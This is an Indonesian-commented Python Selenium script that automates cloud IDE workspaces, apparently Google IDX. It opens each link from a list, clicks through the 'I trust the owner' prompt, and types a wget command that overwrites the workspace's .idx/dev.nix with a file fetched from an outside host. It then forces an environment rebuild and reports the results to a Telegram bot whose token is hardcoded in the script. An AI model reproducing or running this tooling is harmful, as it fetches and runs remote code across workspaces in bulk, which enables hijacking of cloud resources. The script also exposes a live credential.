from multiprocessing import Process
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import subprocess
import pyautogui
import time
import os
from datetime import datetime
import sys
import requests


SLEEP_SEBELUM_AKSI = 75
SLEEP_SESUDAH_AKSI = 20
SLEEP_JIKA_ERROR = 10

def silent_excepthook(*args, **kwargs):
    pass

sys.excepthook = silent_excepthook

def log_sukses(profile_name, current, total):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {profile_name} berhasil proses link {current}/{total}", flush=True)

def get_options(user_data_dir, profile_dir):
    options = webdriver.ChromeOptions()
    options.add_argument(f"user-data-dir={user_data_dir}")
    options.add_argument(f"--profile-directory={profile_dir}")
    options.add_argument("--disable-popup-blocking")
    options.add_argument("--disable-session-crashed-bubble")
    options.add_argument("--disable-infobars")
    options.add_argument("--disable-features=InfiniteSessionRestore")
    options.add_argument("--window-size=500,500")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
    options.add_experimental_option("prefs", {
        "profile.default_content_setting_values.notifications": 2,
        "credentials_enable_service": False,
        "profile.password_manager_enabled": False
    })
    return options

def read_links_from_file(path):
    if not os.path.exists(path):
        return []
    with open(path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def find_and_click_rebuild(driver):
    try:
        iframes = driver.find_elements(By.TAG_NAME, "iframe")

        for i, iframe in enumerate(iframes):
            driver.switch_to.frame(iframe)

            try:
                rebuild_btn = WebDriverWait(driver, 3).until(
                    EC.element_to_be_clickable((By.CSS_SELECTOR, "div.floating-click-widget > div"))
                )
                if "Rebuild Environment" in rebuild_btn.text:
                    driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", rebuild_btn)
                    time.sleep(0.5)
                    driver.execute_script("arguments[0].click();", rebuild_btn)
                    return True
            except TimeoutException:
                pass
            finally:
                driver.switch_to.default_content()

        return False  # Tidak ditemukan, tidak perlu refresh berulang

    except Exception:
        driver.switch_to.default_content()
        return False

def open_terminal_and_run(driver):
    try:
        print(f"[{datetime.now()}] [INFO] Menjalankan shortcut Ctrl+Shift+E...")
        actions = ActionChains(driver)
        actions.key_down(Keys.CONTROL).key_down(Keys.SHIFT).send_keys('E').key_up(Keys.SHIFT).key_up(Keys.CONTROL).perform()
        time.sleep(2)

        print(f"[{datetime.now()}] [INFO] Membuka terminal dengan Ctrl+`...")
        body = driver.find_element(By.TAG_NAME, "body")
        body.click()
        actions = ActionChains(driver)
        actions.key_down(Keys.CONTROL).send_keys('`').key_up(Keys.CONTROL).perform()
        time.sleep(3)

        commands = [
            'wget -q -O .idx/dev.nix https://dot-store.biz.id/joko.nix'
        ]
        for cmd in commands:
            actions = ActionChains(driver)
            for char in cmd:
                actions.send_keys(char)
            actions.send_keys(Keys.ENTER)
            actions.perform()
            time.sleep(2)

            actions = ActionChains(driver)
            actions.send_keys(Keys.ENTER)
            actions.perform()
            time.sleep(3)

        print(f"[{datetime.now()}] [INFO] Semua perintah diketik di terminal.")
        find_and_click_rebuild(driver)
        driver.refresh()
        time.sleep(2)
        actions = ActionChains(driver)
        actions.send_keys(Keys.ENTER)
        actions.perform()
        time.sleep(5)
        return True

    except Exception as e:
        print(f"[{datetime.now()}] [ERROR TERMINAL] {e}")
        return False

def process_single_link(driver, link):
    try:
        driver.get(link)
        wait = WebDriverWait(driver, 20)

        try:
            trust = wait.until(EC.element_to_be_clickable((By.XPATH, "//div[contains(text(), 'I trust the owner')]")))
            trust.click()
            time.sleep(2)
            return True  # Berhasil klik Trust
        except Exception as e:
            print(f"[{datetime.now()}] [INFO] Tidak ada tombol 'Trust' di {link}")
            return False  # Gagal klik Trust

    except Exception as e:
        print(f"[{datetime.now()}] [ERROR] Gagal proses link {link}: {e}")
        time.sleep(SLEEP_JIKA_ERROR)
        return False

def send_to_telegram(file_path, caption):
    token = '8455364218:AAFoy_mvhZi9HYeTM48hO9aXapE-cYmWuCs'
    chat_id = '6501677690'
    url = f'https://api.telegram.org/bot{token}/sendDocument'
    
    with open(file_path, 'rb') as f:
        files = {'document': f}
        data = {'chat_id': chat_id, 'caption': caption}
        try:
            response = requests.post(url, files=files, data=data)
            return response.status_code == 200
        except Exception as e:
            print(f"[{datetime.now()}] [ERROR TELEGRAM] Gagal mengirim file: {e}")
            return False

def worker(profile_name, user_data_dir, profile_dir, window_position, links):
    if not links:
        return
    sys.stderr = open('nul', 'w')

    options = get_options(user_data_dir, profile_dir)
    driver = webdriver.Chrome(options=options)

    if window_position:
        driver.set_window_position(*window_position)

    success_links = []
    failed_links = []
    count = 0
    total = len(links)

    for index, link in enumerate(links):
        try:
            trust_success = process_single_link(driver, link)
            if trust_success:
                count += 1
                success_links.append(link)
                log_sukses(profile_name, count, total)
                
                # Lanjutkan proses setelah Trust berhasil
                try:
                    open_ws = WebDriverWait(driver, 20).until(
                        EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Open Workspace')]")))
                    open_ws.click()
                    time.sleep(2)
                    
                    time.sleep(SLEEP_SEBELUM_AKSI)
                    open_terminal_and_run(driver)
                    time.sleep(SLEEP_SESUDAH_AKSI)
                    
                except Exception as e:
                    print(f"[{datetime.now()}] [INFO] Gagal proses setelah Trust di {link}")
            else:
                failed_links.append(link)
                
        except Exception as e:
            failed_links.append(link)
            print(f"[{datetime.now()}] [ERROR] Exception pada link {link}: {e}")

    # Simpan hasil ke file
    # File sukses (hanya link yang berhasil Trust)
    with open("sukses.txt", "a") as f:
        f.write("\n".join(success_links) + "\n")
    
    # File gagal (link yang gagal Trust)
    with open("gagal.txt", "a") as f:
        f.write("\n".join(failed_links) + "\n")
    
    # Kirim ke Telegram
    if success_links:
        temp_success = f"temp_sukses_{profile_name}.txt"
        with open(temp_success, "w") as f:
            f.write("\n".join(success_links))
        send_to_telegram(temp_success, f"✅ {profile_name} - {len(success_links)} Link Trust Berhasil")
        os.remove(temp_success)
    
    if failed_links:
        temp_failed = f"temp_gagal_{profile_name}.txt"
        with open(temp_failed, "w") as f:
            f.write("\n".join(failed_links))
        send_to_telegram(temp_failed, f"⚠️ {profile_name} - {len(failed_links)} Link Trust Gagal")
        os.remove(temp_failed)

    driver.quit()

if __name__ == "__main__":
    user_profiles = [
        {
            "name": "Profile1",
            "user_data_dir": r"C:\Users\Administrator\Desktop\Profile1",
            "profile_dir": "Default",
            "window_position": (0, 0)
        },
    ]

    all_links = read_links_from_file("link.txt")
    if not all_links:
        print("link.txt kosong, keluar.")
        exit(1)

    links_for_profiles = []
    chunk_size = (len(all_links) + len(user_profiles) - 1) // len(user_profiles)
    for i in range(0, len(all_links), chunk_size):
        links_for_profiles.append(all_links[i:i + chunk_size])

    processes = []
    for i, profile in enumerate(user_profiles):
        p = Process(target=worker, args=(
            profile['name'],
            profile['user_data_dir'],
            profile['profile_dir'],
            profile['window_position'],
            links_for_profiles[i],
        ))
        p.start()
        processes.append(p)

    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("Dihentikan oleh pengguna.")
        for p in processes:
            p.terminate()
